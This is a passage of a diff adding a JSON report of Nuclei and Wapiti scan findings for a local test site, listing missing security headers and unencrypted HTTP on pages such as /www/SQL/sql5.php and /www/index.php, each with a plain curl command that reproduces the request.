+        }
+      ]
+    }
+  },
+  "www_SQL_sql5_php": {
+    "nuclei": {},
+    "wapiti": {
+      "Content Security Policy Configuration": [
+        {
+          "path": "/www/SQL/sql5.php",
+          "info": "CSP is not set for URL: http://localhost:9991/www/SQL/sql5.php",
+          "curl_command": "curl \"http://localhost:9991/www/SQL/sql5.php\"",
+          "wstg": [
+            "WSTG-CONF-12",
+            "OSHP-Content-Security-Policy"
+          ]
+        }
+      ],
+      "Clickjacking Protection": [
+        {
+          "path": "/www/SQL/sql5.php",
+          "info": "X-Frame-Options is not set",
+          "curl_command": "curl \"http://localhost:9991/www/SQL/sql5.php\"",
+          "wstg": [
+            "OSHP-X-Frame-Options"
+          ]
+        }
+      ],
+      "MIME Type Confusion": [
+        {
+          "path": "/www/SQL/sql5.php",
+          "info": "X-Content-Type-Options is not set",
+          "curl_command": "curl \"http://localhost:9991/www/SQL/sql5.php\"",
+          "wstg": [
+            "OSHP-X-Content-Type-Options"
+          ]
+        }
+      ],
+      "Unencrypted Channels": [
+        {
+          "path": "/www/SQL/sql5.php",
+          "info": "No HTTPS redirection for this host. All HTTP requests are served in clear text.",
+          "curl_command": "curl \"http://localhost:9991/www/SQL/sql5.php\"",
+          "wstg": [
+            "WSTG-CRYP-03"
+          ]
+        },
+        {
+          "path": "/www/SQL/sql5.php",
+          "info": "Sensitive data (POST data) was sent over an unencrypted HTTP connection to http://localhost:9991/www/SQL/sql5.php. The server did not enforce HTTPS.",
+          "curl_command": "curl \"http://localhost:9991/www/SQL/sql5.php\" -e \"http://localhost:9991/www/SQL/sql5.php\" -d \"number=default&submit=Submit\"",
+          "wstg": [
+            "WSTG-CRYP-03"
+          ]
+        }
+      ]
+    }
+  },
+  "www_FileUpload_fileupl_html": {
+    "nuclei": {},
+    "wapiti": {
+      "Content Security Policy Configuration": [
+        {
+          "path": "/www/FileUpload/fileupl.html",
+          "info": "CSP is not set for URL: http://localhost:9991/www/FileUpload/fileupl.html",
+          "curl_command": "curl \"http://localhost:9991/www/FileUpload/fileupl.html\"",
+          "wstg": [
+            "WSTG-CONF-12",
+            "OSHP-Content-Security-Policy"
+          ]
+        }
+      ],
+      "Clickjacking Protection": [
+        {
+          "path": "/www/FileUpload/fileupl.html",
+          "info": "X-Frame-Options is not set",
+          "curl_command": "curl \"http://localhost:9991/www/FileUpload/fileupl.html\"",
+          "wstg": [
+            "OSHP-X-Frame-Options"
+          ]
+        }
+      ],
+      "MIME Type Confusion": [
+        {
+          "path": "/www/FileUpload/fileupl.html",
+          "info": "X-Content-Type-Options is not set",
+          "curl_command": "curl \"http://localhost:9991/www/FileUpload/fileupl.html\"",
+          "wstg": [
+            "OSHP-X-Content-Type-Options"
+          ]
+        }
+      ],
+      "Unencrypted Channels": [
+        {
+          "path": "/www/FileUpload/fileupl.html",
+          "info": "No HTTPS redirection for this host. All HTTP requests are served in clear text.",
+          "curl_command": "curl \"http://localhost:9991/www/FileUpload/fileupl.html\"",
+          "wstg": [
+            "WSTG-CRYP-03"
+          ]
+        }
+      ]
+    }
+  },
+  "www_index_php": {
+    "nuclei": {},
+    "wapiti": {
+      "Content Security Policy Configuration": [
+        {
+          "path": "/www/index.php",
+          "info": "CSP is not set for URL: http://localhost:9991/www/index.php",
+          "curl_command": "curl \"http://localhost:9991/www/index.php\"",
+          "wstg": [
+            "WSTG-CONF-12",
+            "OSHP-Content-Security-Policy"
+          ]
+        }
+      ],
+      "Clickjacking Protection": [
+        {
+          "path": "/www/index.php",
+          "info": "X-Frame-Options is not set",
+          "curl_command": "curl \"http://localhost:9991/www/index.php\"",
+          "wstg": [
+            "OSHP-X-Frame-Options"
+          ]
+        }
+      ],
+      "MIME Type Confusion": [
+        {
+          "path": "/www/index.php",
+          "info": "X-Content-Type-Options is not set",
+          "curl_command": "curl \"http://localhost:9991/www/index.php\"",
+          "wstg": [
+            "OSHP-X-Content-Type-Options"
+          ]
+        }
+      ],
+      "Unencrypted Channels": [
+        {
+          "path": "/www/index.php",
+          "info": "No HTTPS redirection for this host. All HTTP requests are served in clear text.",
+          "curl_command": "curl \"http://localhost:9991/www/index.php\"",
+          "wstg": [
+            "WSTG-CRYP-03"
+          ]
+        },
+        {
+          "path": "/www/index.php",
+          "info": "Sensitive data (POST data) was sent over an unencrypted HTTP connection to http://localhost:9991/www/index.php. The server did not enforce HTTPS.",
+          "curl_command": "curl \"http://localhost:9991/www/index.php\" -e \"http://localhost:9991/www/index.php\" -d \"submit=Enter\"",
+          "wstg": [
+            "WSTG-CRYP-03"
+          ]
+        }
+      ]
+    }
+  }
+}
